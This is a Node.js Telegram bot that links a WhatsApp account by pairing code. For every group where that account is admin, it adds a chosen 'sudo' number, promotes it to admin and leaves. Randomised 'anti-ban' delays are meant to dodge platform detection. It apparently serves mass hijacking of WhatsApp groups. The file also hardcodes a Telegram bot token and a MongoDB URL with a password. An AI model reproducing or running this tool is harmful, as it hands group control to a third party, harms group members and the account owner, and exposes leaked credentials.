// --- [ SYSTEM IMPORTS ] ---
import TelegramBot from 'node-telegram-bot-api';
import mongoose from 'mongoose';
import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    delay, 
    fetchLatestBaileysVersion, 
    jidNormalizedUser,
    Browsers,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs-extra'; // Enhanced FS from your snippet
import pn from 'awesome-phonenumber'; // Added for number validation

// --- [ CONFIGURATION ] ---
const CONFIG = {
    BOT_TOKEN: "8113879008:AAGEZaE4v7OZGguk_g-J9qbRm2-yYpiwXc0", // তোমার টোকেন
    MONGO_URL: "mongodb+srv://dxsimu:mnbvcxzdx@dxsimu.0qrxmsr.mongodb.net/?appName=dxsimu", // তোমার মঙ্গো ইউআরএল
    OWNER_IDS: [6703335929, 5136260272], 
    RENDER_URL: "https://coin-bot-wp.onrender.com"
};

// --- [ DX FONT STYLER ] ---
const toDxFont = (text) => {
    const map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ',
        'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
        'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ'
    };
    return text.split('').map(c => map[c] || c).join('');
};

// --- [ UI HELPERS (HTML) ] ---
const ui = {
    header: (title) => `<b>⚡ ${toDxFont(title)}</b>\n━━━━━━━━━━━━━━━━━━━━`,
    code: (text) => `<code>${text}</code>`,
    bold: (text) => `<b>${text}</b>`,
    error: (text) => `<b>🚫 ᴇʀʀᴏʀ:</b> ${text}`,
    success: (text) => `<b>✅ sᴜᴄᴄᴇss:</b> ${text}`
};

// --- [ DATABASE CONNECTION ] ---
mongoose.connect(CONFIG.MONGO_URL)
    .then(() => console.log('✅ MongoDB Connected'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    userId: { type: Number, unique: true },
    firstName: String,
    username: String,
    isBanned: { type: Boolean, default: false },
    waConnected: { type: Boolean, default: false },
    sudoNumber: { type: String, default: null },
    joinedDate: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

// --- [ SERVER FOR RENDER ] ---
const app = express();
app.get('/', (req, res) => res.send('<b>NIKO SYSTEM ONLINE v6.0 (Pair Fix)</b>'));
app.listen(process.env.PORT || 3000, () => console.log("Server Running..."));

// --- [ TELEGRAM BOT INIT ] ---
const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
const userStates = new Map();
const userDataCache = new Map();
const activeSessions = new Map();

// --- [ HELPER: BAN CHECK ] ---
async function isBanned(userId) {
    const user = await User.findOne({ userId });
    return user?.isBanned || false;
}

// --- [ WHATSAPP CORE (UPDATED ALGORITHM) ] ---
async function startWhatsAppSession(tgUserId, loginPhone, sudoPhone) {
    const sessionPath = `./sessions/session_${tgUserId}`;

    // Cleanup Logic (From Mega-MD Logic)
    if (activeSessions.has(tgUserId)) {
        try { activeSessions.get(tgUserId).end(undefined); } catch {}
        activeSessions.delete(tgUserId);
    }
    if (fs.existsSync(sessionPath)) {
        await fs.remove(sessionPath);
        console.log(`♻️ Cleaned Session: ${tgUserId}`);
    }

    // Phone Validation
    const pNumber = pn('+' + loginPhone.replace(/[^0-9]/g, ''));
    if (!pNumber.isValid()) {
        return bot.sendMessage(tgUserId, ui.error("ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ғᴏʀᴍᴀᴛ."), { parse_mode: 'HTML' });
    }
    const cleanPhone = pNumber.getNumber('e164').replace('+', '');

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    // Mega-MD Style Socket Config
    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }), // Cleaner logs
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        // Using Chrome Windows as per your requested snippet for better pairing
        browser: Browsers.windows('Chrome'), 
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        retryRequestDelayMs: 250
    });

    activeSessions.set(tgUserId, sock);

    // --- PAIRING CODE LOGIC (Updated) ---
    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                await delay(2000); // Small delay for socket stability
                
                console.log(`Requesting Code for: ${cleanPhone}`);
                const code = await sock.requestPairingCode(cleanPhone);
                const finalCode = code?.match(/.{1,4}/g)?.join('-') || code;
                
                const msg = `${ui.header('ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ')}\n` +
                            `📱 ɴᴜᴍʙᴇʀ: <code>${cleanPhone}</code>\n` +
                            `🔑 ᴄᴏᴅᴇ: <code>${finalCode}</code>\n\n` +
                            `<i>⚠️ ᴄᴏᴘʏ ᴛʜᴇ ᴄᴏᴅᴇ ᴀɴᴅ ᴜsᴇ ɪᴛ ɪɴ ᴡʜᴀᴛsᴀᴘᴘ > ʟɪɴᴋᴇᴅ ᴅᴇᴠɪᴄᴇs</i>`;
                            
                bot.sendMessage(tgUserId, msg, { parse_mode: 'HTML' });
                
            } catch (err) {
                console.error("Pair Fail:", err);
                bot.sendMessage(tgUserId, ui.error(`Pairing Failed: ${err.message || 'Unknown Error'}\nTry /start again.`));
                activeSessions.delete(tgUserId);
            }
        }, 3000); 
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const statusCode = (lastDisconnect.error)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            if (shouldReconnect) {
                startWhatsAppSession(tgUserId, loginPhone, sudoPhone);
            } else {
                if (fs.existsSync(sessionPath)) await fs.remove(sessionPath);
                await User.updateOne({ userId: tgUserId }, { waConnected: false });
                bot.sendMessage(tgUserId, ui.error("sᴇssɪᴏɴ ᴇxᴘɪʀᴇᴅ. ʟᴏɢɪɴ ᴀɢᴀɪɴ."), { parse_mode: 'HTML' });
            }
        } 
        else if (connection === 'open') {
            console.log(`✅ Connected: ${tgUserId}`);
            bot.sendMessage(tgUserId, ui.success("ᴄᴏɴɴᴇᴄᴛᴇᴅ! sᴛᴀʀᴛɪɴɢ ᴀᴅᴠᴀɴᴄᴇᴅ ᴀʟɢᴏ..."), { parse_mode: 'HTML' });
            await User.updateOne({ userId: tgUserId }, { waConnected: true });
            
            // Run the main task
            await runAdvancedAlgorithm(sock, tgUserId, sudoPhone);
        }
    });
}

// --- [ ADVANCED ALGORITHM: ADD + PROMOTE + LEAVE ] ---
async function runAdvancedAlgorithm(sock, tgUserId, targetNumber) {
    try {
        const formattedSudo = targetNumber.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const botId = jidNormalizedUser(sock.user.id);

        bot.sendMessage(tgUserId, `🔍 ${toDxFont("sᴄᴀɴɴɪɴɢ ᴀʟʟ ɢʀᴏᴜᴘs...")}`, { parse_mode: 'HTML' });

        // Fetch ALL groups (Participating)
        let groups = await sock.groupFetchAllParticipating();
        const groupIds = Object.keys(groups);
        
        let stats = { success: 0, left: 0, fail: 0 };

        for (const jid of groupIds) {
            // Anti-Ban Delay (Random 2-4 seconds)
            await delay(Math.floor(Math.random() * 2000) + 2000);

            try {
                // Fetch fresh metadata
                const metadata = await sock.groupMetadata(jid).catch(() => null);
                
                // Skip if metadata failed or it's an announcement group (bot can't add unless admin)
                if (!metadata || metadata.announce) {
                    stats.fail++;
                    continue; 
                }

                const botAdmin = metadata.participants.find(p => jidNormalizedUser(p.id) === botId);
                const isBotAdmin = botAdmin?.admin; // null, 'admin', or 'superadmin'

                // Only proceed if Bot is Admin
                if (isBotAdmin) {
                    const sudoInGroup = metadata.participants.find(p => jidNormalizedUser(p.id) === formattedSudo);

                    // STEP 1: ADD USER (If not present)
                    if (!sudoInGroup) {
                        try {
                            await sock.groupParticipantsUpdate(jid, [formattedSudo], "add");
                            await delay(3000); // Wait for update
                        } catch (e) {
                            // Adding failed (privacy settings etc)
                            console.log(`Failed to add to ${jid}`);
                        }
                    }

                    // STEP 2: PROMOTE USER (Always check fresh status)
                    const freshMeta = await sock.groupMetadata(jid).catch(() => metadata);
                    const freshSudo = freshMeta.participants.find(p => jidNormalizedUser(p.id) === formattedSudo);

                    if (freshSudo) {
                        if (!freshSudo.admin) {
                            await sock.groupParticipantsUpdate(jid, [formattedSudo], "promote");
                            stats.success++;
                            await delay(2000);
                        } else {
                            // Already admin
                            stats.success++;
                        }
                    }

                    // STEP 3: LEAVE GROUP (Final step)
                    await sock.groupLeave(jid);
                    stats.left++;
                    console.log(`Left group: ${metadata.subject}`);
                } else {
                    // Bot is not admin, cannot do anything
                    stats.fail++;
                }
            } catch (err) {
                console.error(`Error in group ${jid}:`, err.message);
                stats.fail++;
            }
        }

        const report = ui.header('ᴛᴀsᴋ ʀᴇᴘᴏʀᴛ') + 
                       `\n✅ <b>ᴀᴅᴍɪɴ ᴍᴀᴅᴇ:</b> ${stats.success}` +
                       `\n👋 <b>ʟᴇғᴛ ɢʀᴏᴜᴘs:</b> ${stats.left}` +
                       `\n❌ <b>sᴋɪᴘᴘᴇᴅ:</b> ${stats.fail}`;
        
        bot.sendMessage(tgUserId, report, { parse_mode: 'HTML' });

    } catch (e) {
        console.error("Algo Fatal Error:", e);
        bot.sendMessage(tgUserId, ui.error("Algo Stopped: " + e.message), { parse_mode: 'HTML' });
    }
}

// --- [ TELEGRAM HANDLERS ] ---

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    if (await isBanned(chatId)) return bot.sendMessage(chatId, ui.error("🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ"), { parse_mode: 'HTML' });

    // Clear old states
    userStates.delete(chatId);
    userDataCache.delete(chatId);

    await User.updateOne({ userId: chatId }, { 
        firstName: msg.from.first_name, 
        username: msg.from.username 
    }, { upsert: true });

    bot.sendMessage(chatId, 
        ui.header('ɴɪᴋᴏ sʏsᴛᴇᴍ ᴠ6.0') + 
        "\n🚀 <b>Render Optimized Edition</b>\n" +
        "Click below to connect WhatsApp.", 
        {
            reply_markup: { inline_keyboard: [[{ text: "⚡ ᴄᴏɴɴᴇᴄᴛ ᴡʜᴀᴛsᴀᴘᴘ", callback_data: 'login' }]] },
            parse_mode: 'HTML'
        }
    );
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (await isBanned(chatId)) return;

    if (query.data === 'login') {
        userStates.set(chatId, 'WAITING_LOGIN');
        bot.sendMessage(chatId, "📱 <b>Enter WhatsApp Number:</b>\nExample: 919876543210", { parse_mode: 'HTML' });
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || text.startsWith('/') || await isBanned(chatId)) return;

    const state = userStates.get(chatId);

    if (state === 'WAITING_LOGIN') {
        // Simple Validation before proceeding
        if (text.length < 10) return bot.sendMessage(chatId, ui.error("Number too short!"));

        userDataCache.set(chatId, { login: text });
        userStates.set(chatId, 'WAITING_SUDO');
        bot.sendMessage(chatId, "👑 <b>Enter Target/Sudo Number:</b>\n(Who will become admin?)", { parse_mode: 'HTML' });
    }
    else if (state === 'WAITING_SUDO') {
        const data = userDataCache.get(chatId);
        userStates.delete(chatId);
        await User.updateOne({ userId: chatId }, { sudoNumber: text });
        
        bot.sendMessage(chatId, `⚙️ ${toDxFont("ᴘʀᴏᴄᴇssɪɴɢ...")}\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ.`, { parse_mode: 'HTML' });
        
        // Start the Main Process
        startWhatsAppSession(chatId, data.login, text);
    }
});

// --- [ ADMIN TOOLS ] ---
bot.onText(/\/users/, async (msg) => {
    if (!CONFIG.OWNER_IDS.includes(msg.from.id)) return;
    
    const users = await User.find({});
    const loggedIn = users.filter(u => u.waConnected).length;
    
    // Create TXT buffer
    const content = users.map(u => `${u.userId} | ${u.firstName} | ${u.sudoNumber || 'N/A'}`).join('\n');
    const buffer = Buffer.from(content, 'utf-8');

    await bot.sendMessage(msg.chat.id, 
        ui.header('ᴅᴀᴛᴀʙᴀsᴇ') + `\nTotal: ${users.length}\nActive: ${loggedIn}`, 
        { parse_mode: 'HTML' }
    );
    
    bot.sendDocument(msg.chat.id, buffer, {}, { filename: 'users.txt', contentType: 'text/plain' });
});

// Error Handling
process.on('uncaughtException', (e) => console.log('Fatal:', e.message));
process.on('unhandledRejection', (e) => console.log('Reject:', e.message));
